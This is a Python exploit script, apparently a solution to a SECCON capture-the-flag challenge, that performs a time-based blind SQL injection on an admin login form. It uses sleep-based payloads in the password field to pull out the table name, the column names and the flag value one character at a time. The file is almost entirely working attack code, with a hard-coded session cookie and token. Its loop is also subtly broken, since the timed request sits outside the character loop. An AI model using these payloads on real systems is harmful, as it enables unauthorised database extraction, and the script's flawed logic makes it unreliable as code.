import requests
import string
import time

URL = 'http://staging.shooter.pwn.seccon.jp/admin/sessions'
LETTERS = string.ascii_letters + string.digits + "!#$&()*+,-./:;<=>?@[\]^_`{|}~"


def pretty_print_POST(req):
    print('{}\n{}\n{}\n\n{}'.format(
        req.method + ' ' + req.url,
        '\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ))


target = ""

while True:
    flag = False
    for e in LETTERS:
        tmp = target + e
        req = requests.Request(
            'POST',
            URL,
            data={
              # "utf8" :"\xE2\x9C\x93",
                "authenticity_token": "CodCRpjgTlZzcK/ilr42WUwUASDdfoPJ/865RPWy3uOS2nzmtl9T3GnNG+2syYTY1GSc+vXODPykzOVx7n8JuA==",
                "login_id": "admin",
                "commit": "Login",
                # 0.実験用
              # "password" : "' or if(1=1, sleep(3), false) or '"
                # 1.テーブル名を取得
                "password": "' or if(SUBSTRING((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,{})='{}', sleep(3), false) or 'a'='".format(
                    len(tmp), tmp)
                # 2.列名を取得
              # "password" : "' or if(SUBSTRING((select column_name from information_schema.columns where table_name='flags' limit 1,1),1,{})='{}', sleep(3), false) or 'a'='".format(len(tmp),tmp)
                # 3.レコードを取得
              # "password" : "' or if(ASCII(SUBSTRING((select value from flags limit 0,1),{},1)) = {}, sleep(3), false) or 'a'='".format(len(tmp),ord(e))
            },
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": "_shooter_session=l1NW1fRcRDMstlN7MZwJYOBBq2vtB17FLSdELAPhCdp2hV9OD%2FHVFErOBjU80QHxdVwp24TL1MQAAzaXO1dOMLJlzgw%2BnfePLKGRiIrVDhnXNlm7d8FlxJderqSJ8n5jthdfnkLSZStuufw7YRk%3D--KB76yzfpz0%2FRbJTc--vR4mc6IPyNAgJfhs7%2FbtSg%3D%3D"
            },
        )
        prepared = req.prepare()
        # pretty_print_POST(prepared)
        s = requests.Session()

    start = time.time()
    r = s.send(prepared, allow_redirects=False)
    elapsed_time = time.time() - start

    if elapsed_time > 3:
        target = tmp
        print(target)
        flag = True
        break
    # print(r.headers)
    # print(r.text)
    # print(elapsed_time)
    if flag: continue
    exit()
